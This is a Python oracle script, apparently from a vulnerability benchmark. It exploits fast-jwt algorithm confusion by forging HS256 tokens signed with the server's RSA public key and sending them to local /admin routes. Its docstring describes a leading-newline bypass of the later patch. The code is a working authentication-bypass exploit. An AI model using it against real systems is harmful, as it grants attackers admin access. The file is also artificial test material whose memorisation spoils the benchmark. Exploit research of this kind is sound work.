#!/usr/bin/env python3
"""oracle.py — fast-jwt CVE-2023-48223 -> CVE-2026-34950 (algorithm confusion, CWE-347).

Variant A (same sink = src/crypto.js key classification; same flag channel = admin route).

  original_poc : forge HS256 with HMAC secret = server PKCS1 RSA PUBLIC key (NO whitespace),
                 send to /admin (verifier key = PUB). Reaches flag on V0 (V0's `.includes(
                 '-----BEGIN PUBLIC KEY-----')` misses the PKCS1 "RSA PUBLIC KEY" header ->
                 misclassified as HMAC). BLOCKED on V1/V2 (regex catches PKCS1).

  bypass_poc   : forge HS256 with HMAC secret = "\\n" + server PKCS1 RSA PUBLIC key
                 (leading newline, per GHSA-mvf2-f6gm-w987), send to /admin-tainted
                 (verifier key = "\\n"+PUB). Reaches flag on V1 (leading whitespace defeats the
                 ^-anchored, un-trimmed publicKeyPemMatcher -> misclassified as HMAC).
                 BLOCKED on V2 (V2 trims before matching).
"""
from __future__ import annotations

import hashlib
import hmac
import json
import os
import base64
import urllib.request

PORTS = {"v0": 18230, "v1": 18231, "v2": 18232}
HOST = os.environ.get("PCB_HOST", "127.0.0.1")


def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def forge_hs256(secret: bytes, payload: dict) -> str:
    """Forge an HS256 JWT signed with an attacker-chosen HMAC secret (the public key bytes)."""
    header = {"alg": "HS256", "typ": "JWT"}
    signing_input = (
        _b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + _b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = hmac.new(secret, signing_input.encode("ascii"), hashlib.sha256).digest()
    return signing_input + "." + _b64url(sig)


def _get(url: str, headers: dict | None = None, timeout: float = 8.0):
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa
        return 0, f"__error__ {e}"


def _base(version: str) -> str:
    return f"http://{HOST}:{PORTS[version]}"


def fetch_pubkey(version: str) -> str:
    _, body = _get(f"{_base(version)}/pubkey")
    return body


def _admin(version: str, route: str, token: str):
    code, body = _get(f"{_base(version)}/{route}", headers={"Authorization": f"Bearer {token}"})
    return {"version": version, "route": route, "status": code, "body": body}


def original_poc(version: str = "v1"):
    """CVE-2023-48223 seed: HS256 secret = plain PKCS1 public key -> /admin (clean-key route)."""
    pub = fetch_pubkey(version)
    secret = pub.encode("utf-8")  # NO leading whitespace
    token = forge_hs256(secret, {"sub": "attacker", "role": "admin"})
    return _admin(version, "admin", token)


def run_probe(candidate, version: str = "v1"):
    """Uniform probe: a candidate carries {secret_prefix, route}. secret = prefix + pubkey."""
    if isinstance(candidate, dict):
        prefix = candidate.get("secret_prefix", "")
        route = candidate.get("route", "admin")
    else:
        prefix = getattr(candidate, "secret_prefix", "")
        route = getattr(candidate, "route", "admin")
    pub = fetch_pubkey(version)
    secret = (prefix + pub).encode("utf-8")
    token = forge_hs256(secret, {"sub": "attacker", "role": "admin"})
    return _admin(version, route, token)


def bypass_poc(version: str = "v1"):
    """[HELD-OUT] CVE-2026-34950 residual. Lazy import so the SUT side need not ship it."""
    from _heldout.bypass_poc import bypass_poc as _b
    return _b(version)
